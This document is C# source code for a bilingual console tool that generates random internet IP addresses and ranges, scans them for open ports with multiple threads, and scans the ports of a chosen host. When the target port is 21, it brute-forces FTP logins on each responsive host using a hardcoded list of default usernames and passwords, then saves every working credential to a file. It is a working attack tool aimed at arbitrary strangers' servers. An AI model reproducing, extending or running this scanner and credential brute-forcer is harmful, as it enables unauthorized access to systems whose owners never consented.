using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConsoleApp82
{
    public class Program
    {
        //MADE BY ATERRAGON
        //HECHO POR ATERRAGON

        // HILO GENERAL
        public static void General(object parameters)
        {
            dynamic f = parameters;
            int valorinicial = f.A;
            int puerto1 = f.B;
            int timeout = f.C;
            int contador1 = f.D;
            string path2res1 = f.E;
            int resultadolen = f.F;
            string[] lista = f.G;
            int valorfinal = f.H;
            int idi = f.I;
            int valor = resultadolen - valorinicial;
            string[] c = new string[valor];
            string path2res = path2res1;
            string[] ftpvivos;
            string idi1 = null;
            string idi2 = null;

            if (idi == 1)
            {
                idi1 = "Connected to";
                idi2 = "NOT Connected to";
            }
            else if (idi == 2)
            {
                idi1 = "Conectado a";
                idi2 = " NO  Conectado a";
            }
            if (puerto1 != 21)
            {
                for (int i = valorinicial; i < valorfinal; i++)
                {
                    TcpClient tcp = new TcpClient();
                    try
                    {
                        tcp.ConnectAsync(lista[i], puerto1).Wait(timeout);
                        if (tcp.Connected)
                        {
                            Console.WriteLine("{0} {1}", idi1, lista[i]);
                            tcp.Close();
                            ////Change result in the txt
                            c[contador1] = lista[i];//HERE
                            contador1++;
                        }
                        else
                            tcp.Close();
                        Console.WriteLine(" {0} {1}", idi2, lista[i]);
                    }
                    catch (Exception)
                    {
                        tcp.Close();
                        Console.WriteLine(" {0} {1}", idi2, lista[i]);
                    }
                    finally
                    {
                    }
                }
                int reduccion = valor - contador1;
                if (c[0] != null)
                {
                    Array.Resize(ref c, c.Length - reduccion);
                }

                if (c[0] != null)
                {
                    File.WriteAllLines(path2res, c);
                }
            }
            else if (puerto1 == 21)
            {
                for (int i = valorinicial; i < valorfinal; i++)
                {
                    TcpClient tcp = new TcpClient();
                    try
                    {
                        tcp.ConnectAsync(lista[i], puerto1).Wait(timeout);
                        if (tcp.Connected)
                        {
                            Console.WriteLine("{0} {1}", idi1, lista[i]);
                            tcp.Close();
                            c[contador1] = lista[i];
                            contador1++;
                        }
                        else

                            tcp.Close();
                        Console.WriteLine(" {0} {1}", idi2, lista[i]);
                    }
                    catch (Exception)
                    {
                        tcp.Close();
                        Console.WriteLine(" {0} {1}", idi2, lista[i]);
                    }
                    finally
                    {
                    }
                }
                //Change users and passwords Brute Force FTP
                string[] usuario = { "ftp", "anonymous", "admin", "guest" };
                string[] contrasenas = { "ftp", "password", "root", "admin", "toor", "12345", "guest" };
                ftpvivos = new string[valor];
                int cuenta = 0;
                for (int z = 0; z < c.Length; z++)
                {
                    if (c[z] == null)
                    {
                        break;
                    }
                    else
                    {
                        for (int i = 0; i < usuario.Length; i++)
                        {
                            for (int b = 0; b < contrasenas.Length; b++)
                            {
                                try
                                {
                                    string a = "ftp://" + c[z];
                                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(a);
                                    request.Timeout = 5000;
                                    request.Method = WebRequestMethods.Ftp.ListDirectory;
                                    request.Credentials = new NetworkCredential(usuario[i], contrasenas[b]);
                                    request.GetResponse();

                                    Console.WriteLine("{0} {1}:{2} {3}------------------------------", idi1, c[z], usuario[i], contrasenas[b]);
                                    //Change result in the txt
                                    string ftpres = a + usuario[i] + contrasenas[b];//HERE
                                    ftpvivos[cuenta] = ftpres;
                                    z += 1;
                                    i = 0;
                                    b = 0;
                                    ++contador1;
                                    ++cuenta;
                                }
                                catch
                                {
                                    Console.WriteLine("{0} {1}:{2} {3}", idi2, c[z], usuario[i], contrasenas[b]);
                                }
                            }
                        }
                    }
                }
                int reduccion = valor - contador1;
                if (ftpvivos[0] != null)
                {
                    Array.Resize(ref ftpvivos, valor - reduccion);
                }
                if (ftpvivos[0] != null)
                {
                    File.WriteAllLines(path2res, ftpvivos);
                }
            }

            Thread.Sleep(10000000);
        }

        private static void Main(string[] args)
        {
            int seleccion;
            int cantidad;
            int contador = 0;
            int timeout = 0;
            string cerrar;

            Random numerosAleatorios = new Random();
            System.Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Select Lenguage");
            Console.WriteLine("1.-English\n2.-Spanish");
            int idioma = Convert.ToInt32(Console.ReadLine());
            string en = null; string en1 = null; string en2 = null; string en3 = null; string en4 = null; string en5 = null; string en6 = null; string en7 = null; string en8 = null;
            string es = null; string es1 = null; string es2 = null; string es3 = null;
            string ek = null;
            string em = null; string em1 = null; string em2 = null; string em3 = null; string em4 = null; string em5 = null; string em6 = null;
            string ep = null; string ep1 = null; string ep2 = null; string ep3 = null;
            if (idioma == 1)
            {
                //option 1
                en = "Select an option";
                en1 = "1.-Random IP \n2.-create ip \n3.-create Range \n4.-Analyze ports of a specific IP \n5.-Analyze IP Range";
                en2 = "Timeout in milliseconds";
                en3 = "Enter the IP number to generate";
                en4 = "Enter the port";
                en5 = "Select the location where the txt with the ip's will be saved Example: C: Users\\Hacker\\Desktop";
                en6 = "Name of the txt to generate";
                en7 = "1-Check ip and port \n2-Do not check";
                en8 = "Enter the number of Threads to use";
                //option 2
                es = "Enter the IP number to generate";
                es1 = "Select the Initial IP range to be generated randomly in the following format 1.0.0.0 - 255.255.255.255";
                es2 = "Press Enter to generate the ip ";
                es3 = "The Initial Range is higher than the Final Range";
                //option3
                ek = "Enter the number of ranges to generate";
                //option 4
                em = "Enter the ip to analyze";
                em1 = "1.-Analyze a range of ports \n2.-Analyze specific ports";
                em2 = "Initial port";
                em3 = "End port";
                em4 = "Enter the ports to analyze (Enter an enter for each port, type 0 to finish)";
                em5 = "Connected to";
                em6 = "NOT Connected to";
                //option5
                ep = "Invalid Range Error";
                ep1 = "Total Ip";
                ep2 = "1.-Save the generated ip \n2.- Check and save the generated ip";
                ep3 = "Enter the letter z and press enter to stop the analyzer";
            }
            else if (idioma == 2)
            {
                //opcion 1
                en = "Seleccione una opcion";
                en1 = "1.-IP aleatoria \n2.-Crear ip \n3.-crear Rangos \n4.-Analizar puertos de una IP específica \n5.-Analizar rango de IP";
                en2 = "Tiemout en milisegundos";
                en3 = "Ingrese el número de IP para generar";
                en4 = "Ingrese el puerto";
                en5 = "Seleccione la ubicación donde se guardará el txt con las ip's Ejemplo: C: Users\\Hacker\\Desktop";
                en6 = "Nombre del txt a generar";
                en7 = "1-Verificar ip y puerto \n2-No verificar";
                en8 = "Ingrese el número de hilos a utilizar";
                //opcion2
                es = "Ingrese el numero de ip a generar";
                es1 = "Seleccione el Rango inicial de ip a generar de forma aleatoria en el sig formato 1.0.0.0 - 255.255.255.255";
                es2 = "Presione Enter para generar los ip";
                es3 = "El Rango Inicial es mayor al Rango Final";
                //opcion3
                ek = "Ingrese el numero de rangos a generar";
                //opcion4
                em = "Ingrese el ip a analizar";
                em1 = "1.-Analizar un rango de puertos\n2.-Analizar puertos especificos";
                em2 = "Puerto inicial";
                em3 = "Puerto final";
                em4 = "Ingrese Los puertos a analizar (Ingrese un enter por cada puerto, escriba 0 para finalizar)";
                em5 = "Conectado a";
                em6 = " NO  Conectado a";
                //opcion5
                ep = "Error Rango Invalido";
                ep1 = "Total de ip";
                ep2 = "1.-Guardar Los ip generados\n2.- Comprobar y guardar los ip generados";
                ep3 = "Ingrese la letra z y presione enter para detener el analizador";
            }
            Console.WriteLine("{0}", en);
            Console.WriteLine("{0}", en1);
            seleccion = Convert.ToInt32(Console.ReadLine());
            if (seleccion != 2 && seleccion != 3)
            {
                Console.WriteLine("{0}", en2);
                timeout = Convert.ToInt32(Console.ReadLine());
            }

            if (seleccion == 1)
            {
                Console.Clear();

                Console.WriteLine("{0}", en3);
                cantidad = Convert.ToInt32(Console.ReadLine());
                Console.Clear();
                Console.WriteLine("{0}", en4);
                int puerto = Convert.ToInt32(Console.ReadLine());
                Console.Clear();
                Console.WriteLine("{0}", en5);
                string path1 = Convert.ToString(Console.ReadLine());
                Console.WriteLine("{0}", en6);
                string txt = Convert.ToString(Console.ReadLine());
                string path1res = path1 + "\\" + txt + ".txt";
                Console.Clear();
                Console.WriteLine("{0}", en7);
                int comprobar = Convert.ToInt32(Console.ReadLine());
                Console.Clear();
                string[] lineas = new string[cantidad];
                string[] lineas1 = new string[cantidad];
                string[] lineas2 = new string[cantidad];
                string[] lineas3 = new string[cantidad];
                string[] resultado = new string[cantidad];
                Console.Clear();
                if (comprobar == 1)
                {
                    Console.Clear();
                    Console.WriteLine("{0}", en8);

                    int hilosa = Convert.ToInt32(Console.ReadLine());

                    for (int i = 0; i < cantidad; i++)

                    {
                        string r = Convert.ToString(numerosAleatorios.Next(1, 256));
                        string r1 = Convert.ToString(numerosAleatorios.Next(0, 256));
                        string r2 = Convert.ToString(numerosAleatorios.Next(0, 256));
                        string r3 = Convert.ToString(numerosAleatorios.Next(0, 256));
                        lineas[i] =
                            (r);
                        lineas1[i] =
                            (r1);
                        lineas2[i] =
                            (r2);
                        lineas3[i] =
                            (r3);
                        resultado[i] = r + "." + r1 + "." + r2 + "." + r3;
                    }
                    int valor = cantidad / hilosa;
                    string[] b = new string[resultado.Length];
                    string[] c = new string[valor];

                    /*dynamic f = parameters;
                    int valorinicial = f.A;
                    int puerto1 = f.B;
                    int timeout = f.C;
                    int contador1 = f.D;
                    string path2res1 = f.E;
                    int resultadolen = f.F;
                    string[] lista = f.G;
                    int valorfinal = f.h;*/

                    for (int o = 0; o < hilosa; o++)
                    {
                        Thread hilogeneral = new Thread(new ParameterizedThreadStart(General));
                        if (o == hilosa - 1)
                        {
                            string path2res = path1 + "\\" + txt + o + ".txt";
                            int A = (resultado.Length / hilosa) * o;
                            int B = puerto;
                            int C = timeout;
                            int D = contador;
                            string E = path2res;
                            int F = resultado.Length;
                            string[] G = resultado;
                            int H = resultado.Length;
                            int I = idioma;
                            hilogeneral.Start(new { A, B, C, D, E, F, G, H, I });
                        }
                        else
                        {
                            string path2res = path1 + "\\" + txt + o + ".txt";
                            int A = (resultado.Length / hilosa) * o;
                            int B = puerto;
                            int C = timeout;
                            int D = contador;
                            string E = path2res;
                            int F = resultado.Length;
                            string[] G = resultado;
                            int H = (resultado.Length / hilosa) * (o + 1);
                            int I = idioma;
                            hilogeneral.Start(new { A, B, C, D, E, F, G, H, I });
                        }
                    }

                    cerrar = Convert.ToString(Console.ReadLine());

                    if (cerrar == "z")
                    {
                        int pa1 = 0;
                        string[] final1 = new string[resultado.Length];
                        for (int i = 0; i < hilosa; i++)
                        {
                            string path3res = path1 + "\\" + txt + i + ".txt";
                            if (File.Exists(path3res))
                            {
                                string[] texto = File.ReadAllLines(path3res);

                                for (int m = 0; m < texto.Length; m++)
                                {
                                    if (!String.IsNullOrEmpty(texto[m]))
                                    {
                                        Console.WriteLine("{0}", texto[m]);
                                        final1[pa1] = texto[m];
                                        pa1++;
                                    }
                                }
                            }

                            File.Delete(path3res);
                        }

                        string path0res1 = path1 + "\\" + txt + "final" + ".txt";
                        File.WriteAllLines(path0res1, final1);
                        Environment.Exit(1);
                    }
                    int pa = 0;
                    string[] final = new string[resultado.Length];
                    for (int i = 0; i < hilosa; i++)
                    {
                        string path3res = path1 + "\\" + txt + i + ".txt";
                        if (File.Exists(path3res))
                        {
                            string[] texto = File.ReadAllLines(path3res);

                            for (int m = 0; m < texto.Length; m++)
                            {
                                if (!String.IsNullOrEmpty(texto[m]))
                                {
                                    Console.WriteLine("{0}", texto[m]);
                                    final[pa] = texto[m];
                                    pa++;
                                }
                            }
                        }

                        File.Delete(path3res);
                    }

                    string path0res = path1 + "\\" + txt + "final" + ".txt";
                    File.WriteAllLines(path0res, final);
                    Environment.Exit(1);
                    Environment.Exit(-1);
                }
                else if (comprobar == 2)
                {
                    for (int i = 0; i < cantidad; i++)

                    {
                        string r = Convert.ToString(numerosAleatorios.Next(1, 256));
                        string r1 = Convert.ToString(numerosAleatorios.Next(0, 256));
                        string r2 = Convert.ToString(numerosAleatorios.Next(0, 256));
                        string r3 = Convert.ToString(numerosAleatorios.Next(0, 256));
                        lineas[i] =
                            (r);
                        lineas1[i] =
                            (r1);
                        lineas2[i] =
                            (r2);
                        lineas3[i] =
                            (r3);
                        resultado[i] = r + "." + r1 + "." + r2 + "." + r3;
                    }
                    File.WriteAllLines(path1res, resultado);
                }
            }
            else if (seleccion == 2)
            {
                Console.Clear();
                Console.WriteLine("{0}", es);
                cantidad = Convert.ToInt32(Console.ReadLine());
                Console.Clear();
                Console.WriteLine("{0}", es1);
                string cadena = Convert.ToString(Console.ReadLine());
                char delimitador = '-';
                string[] ab = cadena.Split(delimitador);
                char delimitador0 = '.';
                string[] a0 = ab[0].Split(delimitador0);
                char delimitador1 = '.';
                string[] a1 = ab[1].Split(delimitador1);
                int[] b0 = Array.ConvertAll(a0, int.Parse);
                int[] b1 = Array.ConvertAll(a1, int.Parse);
                Console.Clear();
                Console.WriteLine("{0}", en5);
                string path2 = Convert.ToString(Console.ReadLine());
                Console.WriteLine("{0}", en6);
                string txt2 = Convert.ToString(Console.ReadLine());
                string path2res = path2 + "\\" + txt2 + ".txt";
                Console.WriteLine("{0}", es2);
                Console.Read();
                int comprobacion = b0[0] + b0[1] + b0[2] + b0[3];
                int comprobacion2 = b1[0] + b1[1] + b1[2] + b1[3];

                if (comprobacion < comprobacion2)
                {
                    if (b0[0] != b1[0])
                    {
                        b0[1] = 0;
                        b1[1] = 255;
                        b0[2] = 0;
                        b1[2] = 255;
                        b0[3] = 0;
                        b1[3] = 255;
                    }
                    else if (b0[1] != b1[1])
                    {
                        b0[2] = 0;
                        b1[2] = 255;
                        b0[3] = 0;
                        b1[3] = 255;
                    }
                    else if (b0[2] != b1[2])
                    {
                        b0[3] = 0;
                        b1[3] = 255;
                    }

                    string[] lineas = new string[cantidad];
                    string[] lineas1 = new string[cantidad];
                    string[] lineas2 = new string[cantidad];
                    string[] lineas3 = new string[cantidad];
                    string[] resultado = new string[cantidad];
                    Console.Clear();
                    b1[0] += 1;
                    b1[1] += 1;
                    b1[2] += 1;
                    b1[3] += 1;

                    for (int i = 0; i < cantidad; i++)
                    {
                        string r = Convert.ToString(numerosAleatorios.Next(b0[0], b1[0]));
                        string r1 = Convert.ToString(numerosAleatorios.Next(b0[1], b1[1]));
                        string r2 = Convert.ToString(numerosAleatorios.Next(b0[2], b1[2]));
                        string r3 = Convert.ToString(numerosAleatorios.Next(b0[3], b1[3]));
                        lineas[i] =
                            (r);
                        lineas1[i] =
                            (r1);
                        lineas2[i] =
                            (r2);
                        lineas3[i] =
                            (r3);
                        resultado[i] = r + "." + r1 + "." + r2 + "." + r3;

                        File.WriteAllLines(path2res, resultado);
                    }
                }
                else if (comprobacion > comprobacion2)
                {
                    Console.Clear();
                    Console.WriteLine("{0}", es3);
                    Console.Read();
                }
            }

            if (seleccion == 3)
            {
                Console.Clear();

                Console.WriteLine("{0}", ek);
                cantidad = Convert.ToInt32(Console.ReadLine());
                Console.Clear();
                Console.WriteLine("{0}", en5);
                string path1 = Convert.ToString(Console.ReadLine());
                Console.WriteLine("{0}", en6);
                string txt3 = Convert.ToString(Console.ReadLine());
                string path3res = path1 + "\\" + txt3 + ".txt";
                Console.Clear();
                string[] lineas = new string[cantidad];
                string[] lineas1 = new string[cantidad];
                string[] lineas2 = new string[cantidad];
                string[] lineas3 = new string[cantidad];
                string[] lineas4 = new string[cantidad];
                string[] lineas5 = new string[cantidad];
                string[] lineas6 = new string[cantidad];
                string[] lineas7 = new string[cantidad];
                string[] resultado = new string[cantidad];
                for (int i = 1; i < cantidad; i++)
                {
                    string r = Convert.ToString(numerosAleatorios.Next(1, 256));
                    string r1 = Convert.ToString(numerosAleatorios.Next(0, 256));
                    string r2 = Convert.ToString(numerosAleatorios.Next(0, 256));
                    string r3 = Convert.ToString(numerosAleatorios.Next(0, 256));
                    string r4 = Convert.ToString(numerosAleatorios.Next(1, 256));
                    string r5 = Convert.ToString(numerosAleatorios.Next(0, 256));
                    string r6 = Convert.ToString(numerosAleatorios.Next(0, 256));
                    string r7 = Convert.ToString(numerosAleatorios.Next(0, 256));
                    int l = Convert.ToInt32(r);
                    int l4 = Convert.ToInt32(r4);

                    if (l <= l4)
                    {
                        lineas[i] =
                             (r);
                        lineas1[i] =
                            (r1);
                        lineas2[i] =
                            (r2);
                        lineas3[i] =
                            (r3);
                        lineas4[i] =
                            (r4);
                        lineas5[i] =
                            (r5);
                        lineas6[i] =
                            (r6);
                        lineas7[i] =
                            (r7);
                        contador++;
                    }
                    else
                    {
                        --i;
                    }
                    resultado[contador] = lineas[i] + "." + lineas1[i] + "." + lineas2[i] + "." + lineas3[i] + "-" + lineas4[i] + "." + lineas5[i] + "." + lineas6[i] + "." + lineas7[i];
                    File.WriteAllLines(path3res, resultado);
                }
            }
            if (seleccion == 4)
            {
                Console.WriteLine("{0}", em);
                string ip = Convert.ToString(Console.ReadLine());
                Console.WriteLine("{0}", em1);
                int des = Convert.ToInt32(Console.ReadLine());
                if (des == 1)
                {
                    Console.WriteLine("{0}", em2);
                    int puertoinicial = Convert.ToInt32(Console.ReadLine());
                    Console.WriteLine("{0}", em3);
                    int puertofinal = Convert.ToInt32(Console.ReadLine());
                    Console.Clear();
                    Console.WriteLine("{0}", en5);
                    string path1 = Convert.ToString(Console.ReadLine());
                    Console.WriteLine("{0}", en6);
                    string txt = Convert.ToString(Console.ReadLine());
                    string path1res = path1 + "\\" + txt + ".txt";
                    Console.Clear();
                    int longitud = puertofinal - puertoinicial;
                    string[] b = new string[longitud];
                    string[] c = new string[longitud];
                    for (int i = puertoinicial; i < puertofinal; i++)
                    {
                        TcpClient tcp = new TcpClient();
                        try
                        {
                            tcp.ConnectAsync(ip, i).Wait(timeout);
                            if (tcp.Connected)
                            {
                                Console.WriteLine("{0} {1}:{2}", em5, ip, i);
                                tcp.Close();
                                contador++;
                                b[contador] = ip + ":" + i;
                            }
                            else
                                tcp.Close();
                            Console.WriteLine(" {0} {1}:{2}", em6, ip, i);
                        }
                        catch (Exception)
                        {
                            tcp.Close();
                            Console.WriteLine(" {0} {1}:{2}", em6, ip, i);
                        }
                        finally
                        {
                            c = b;
                        }
                    }
                    File.WriteAllLines(path1res, b);
                }
                if (des == 2)
                {
                    int longitud = 65000;
                    int[] puertos = new int[longitud];
                    Console.WriteLine("{0}", en5);
                    string path1 = Convert.ToString(Console.ReadLine());
                    Console.Clear();
                    Console.WriteLine("{0}", en6);
                    string txt = Convert.ToString(Console.ReadLine());
                    string path1res = path1 + "\\" + txt + ".txt";
                    Console.Clear();
                    Console.WriteLine("{0}", em4);

                    for (int i = 0; i < 65000; i++)
                    {
                        int port = Convert.ToInt32(Console.ReadLine());

                        puertos[i] = port;
                        if (port == 0)
                        {
                            break;
                        }
                    }
                    Console.Clear();

                    string[] b = new string[puertos.Length];
                    string[] c = new string[puertos.Length];
                    for (int i = 0; i < puertos.Length; i++)
                    {
                        TcpClient tcp = new TcpClient();
                        try
                        {
                            tcp.ConnectAsync(ip, puertos[i]).Wait(timeout);
                            if (tcp.Connected)
                            {
                                Console.WriteLine("{0} {1}:{2}", em5, ip, puertos[i]);
                                tcp.Close();
                                contador++;
                                b[contador] = ip + ":" + puertos[i];
                            }
                            else
                                tcp.Close();
                            Console.WriteLine(" {0} {1}:{2}", em6, ip, puertos[i]);
                        }
                        catch (Exception)
                        {
                            tcp.Close();
                            Console.WriteLine(" {0} {1}:{2}", em6, ip, puertos[i]);
                        }
                        finally
                        {
                            c = b;
                        }
                        if (puertos[i] == 0)
                        {
                            break;
                        }
                    }
                    File.WriteAllLines(path1res, b);
                    Console.Read();
                }
            }

            if (seleccion == 5)
            {
                Console.Clear();
                Console.WriteLine("{0}", es1);
                string cadena = Convert.ToString(Console.ReadLine());
                char delimitador = '-';
                string[] ab = cadena.Split(delimitador);
                char delimitador0 = '.';
                string[] a0 = ab[0].Split(delimitador0);
                char delimitador1 = '.';
                string[] a1 = ab[1].Split(delimitador1);
                int[] b0 = Array.ConvertAll(a0, int.Parse);
                int[] b1 = Array.ConvertAll(a1, int.Parse);
                Console.Clear();
                Console.WriteLine("{0}", en5);
                string path2 = Convert.ToString(Console.ReadLine());
                Console.WriteLine("{0}", en6);
                string txt2 = Convert.ToString(Console.ReadLine());
                string path2res = path2 + "\\" + txt2 + ".txt";

                Console.WriteLine("{0}", es2);
                Console.Read();
                int resultado1 = (b1[0] - b0[0]) * 16777216;
                int resultado2 = (b1[1] - b0[1]) * 65536;
                int resultado3 = (b1[2] - b0[2]) * 256;
                int resultado4 = b1[3] - b0[3];
                int total = resultado1 + resultado2 + resultado3 + resultado4;
                int defi = total;

                string[] resultado = new string[defi];
                if (b0[0] > 255 || b0[1] > 255 || b0[2] > 255 || b0[3] > 255 || b1[0] > 255 || b1[1] > 255 || b1[2] > 255 || b1[3] > 255)
                {
                    Console.WriteLine("{0}", ep);
                }
                Console.WriteLine("{0} {1}", ep1, total);

                Console.Read();
                for (int i = 1; i < defi; i++)
                {
                    if (b0[0] == b1[0] && b0[1] == b1[1] && b0[2] == b1[2] && b0[3] == b1[3])
                    {
                        break;
                    }
                    ++b0[3];
                    if (b0[3] == 256 && b0[2] != 255)
                    {
                        ++b0[2];
                        b0[3] = 0;
                    }
                    else if (b0[1] != 255 && b0[2] == 255 && b0[3] == 256)

                    {
                        ++b0[1];
                        b0[2] = 0;
                        b0[3] = 0;
                    }
                    else if (b0[1] == 255 && b0[2] == 255 && b0[3] == 256)
                    {
                        ++b0[0];
                        b0[1] = 0;
                        b0[2] = 0;
                        b0[3] = 0;
                    }

                    resultado[i] = b0[0] + "." + b0[1] + "." + b0[2] + "." + b0[3];
                }

                Console.WriteLine("{0}", ep2);
                int des = Convert.ToInt32(Console.ReadLine());
                if (des == 1)
                {
                    File.WriteAllLines(path2res, resultado);
                }
                else if (des == 2)

                {
                    Console.WriteLine("{0}", ep3);
                    Console.WriteLine("{0}", en4);
                    int puerto = Convert.ToInt32(Console.ReadLine());

                    Console.Clear();
                    Console.WriteLine("{0}", en8);
                    int hilosa = Convert.ToInt32(Console.ReadLine());
                    int valor = resultado.Length / hilosa;

                    for (int o = 0; o < hilosa; o++)
                    {
                        Thread hilogeneral = new Thread(new ParameterizedThreadStart(General));
                        if (o == hilosa - 1)
                        {
                            string path1res = path2 + "\\" + txt2 + o + ".txt";
                            int A = (resultado.Length / hilosa) * o;
                            int B = puerto;
                            int C = timeout;
                            int D = contador;
                            string E = path1res;
                            int F = resultado.Length;
                            string[] G = resultado;
                            int H = resultado.Length;
                            int I = idioma;
                            hilogeneral.Start(new { A, B, C, D, E, F, G, H, I });
                        }
                        else
                        {
                            string path1res = path2 + "\\" + txt2 + o + ".txt";
                            int A = (resultado.Length / hilosa) * o;
                            int B = puerto;
                            int C = timeout;
                            int D = contador;
                            string E = path1res;
                            int F = resultado.Length;
                            string[] G = resultado;
                            int H = (resultado.Length / hilosa) * (o + 1);
                            int I = idioma;
                            hilogeneral.Start(new { A, B, C, D, E, F, G, H, I });
                        }
                    }
                    Console.WriteLine("Searching");

                    cerrar = Convert.ToString(Console.ReadLine());

                    if (cerrar == "z")
                    {
                        int pa1 = 0;
                        string[] final1 = new string[resultado.Length];
                        for (int i = 0; i < hilosa; i++)
                        {
                            string path3res = path2 + "\\" + txt2 + i + ".txt";
                            if (File.Exists(path3res))
                            {
                                string[] texto = File.ReadAllLines(path3res);

                                for (int m = 0; m < texto.Length; m++)
                                {
                                    if (!String.IsNullOrEmpty(texto[m]))
                                    {
                                        Console.WriteLine("{0}", texto[m]);
                                        final1[pa1] = texto[m];
                                        pa1++;
                                    }
                                }
                            }

                            File.Delete(path3res);
                        }

                        string path0res1 = path2 + "\\" + txt2 + "final" + ".txt";
                        File.WriteAllLines(path0res1, final1);
                        Environment.Exit(1);
                    }
                    int pa = 0;
                    string[] final = new string[resultado.Length];
                    for (int i = 0; i < hilosa; i++)
                    {
                        string path3res = path2 + "\\" + txt2 + i + ".txt";
                        if (File.Exists(path3res))
                        {
                            string[] texto = File.ReadAllLines(path3res);

                            for (int m = 0; m < texto.Length; m++)
                            {
                                if (!String.IsNullOrEmpty(texto[m]))
                                {
                                    Console.WriteLine("{0}", texto[m]);
                                    final[pa] = texto[m];
                                    pa++;
                                }
                            }
                        }

                        File.Delete(path3res);
                    }

                    string path0res = path2 + "\\" + txt2 + "final" + ".txt";
                    File.WriteAllLines(path0res, final);
                    Environment.Exit(1);
                    Environment.Exit(-1);
                }
            }
        }
    }
}
